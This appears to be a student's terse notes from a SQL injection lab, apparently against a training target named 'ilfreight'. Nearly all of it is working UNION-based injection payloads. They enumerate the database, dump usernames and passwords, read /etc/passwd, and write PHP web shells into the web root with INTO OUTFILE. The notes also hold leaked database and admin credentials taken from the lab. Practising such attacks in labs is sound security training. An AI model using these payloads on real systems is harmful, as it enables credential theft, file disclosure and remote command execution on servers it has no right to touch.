'UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -


'UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -

'UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'-- -

'UNION SELECT 1,id,username,password FROM ilfreight.users-- -


'localhost', 'DB_USERNAME'=>'root', 'DB_PASSWORD'=>'dB_pAssw0rd_iS_flag!', 'DB_DATABASE'=>'ilfreight' ); $conn = mysqli_connect($config['DB_HOST'], $config['DB_USERNAME'], $config['DB_PASSWORD'], $config['DB_DATABASE']); if (mysqli_connect_errno($conn)) { echo "Failed connecting. " . mysqli_connect_error() . "
"; } ?>

'UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -



id,username,password

' UNION SELECT 1,username,password,4 from ilfreight.users INTO OUTFILE '/tmp/credentials'-- -

' UNION SELECT 1,"blablabla",3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -


'UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"-- -

'UNION SELECT "","<?php system($_GET['cmd']); ?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -

'UNION SELECT "","<?=`$_GET[0]`?>","","" INTO OUTFILE '/var/www/html/shell.php'-- -


A'UNION SELECT 1,2,3,4,5-- -
A'UNION SELECT 1,user(),@@version,4,5-- -
A'UNION SELECT 1,SCHEMA_NAME,@@version,4,5 FROM INFORMATION_SCHEMA.SCHEMATA-- -
     = root

A'UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 FROM INFORMATION_SCHEMA.columns WHERE table_schema='backup'-- -


'UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM **information_schema.columns** WHERE table_name= 'Table name'-- -

'UNION SELECT 1,username,password,4,5 from backup.admin_bk-- -

admin:Inl@n3_fre1gh7_adm!n


'UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5-- -

'UNION SELECT "",'blablabla',"","","" INTO OUTFILE '/var/www/html/dashboard/proof.txt'-- -

'UNION SELECT "","","<?php system($_GET['cmd']); ?>","","" into outfile "/var/www/html/dashboard/shell.php"-- -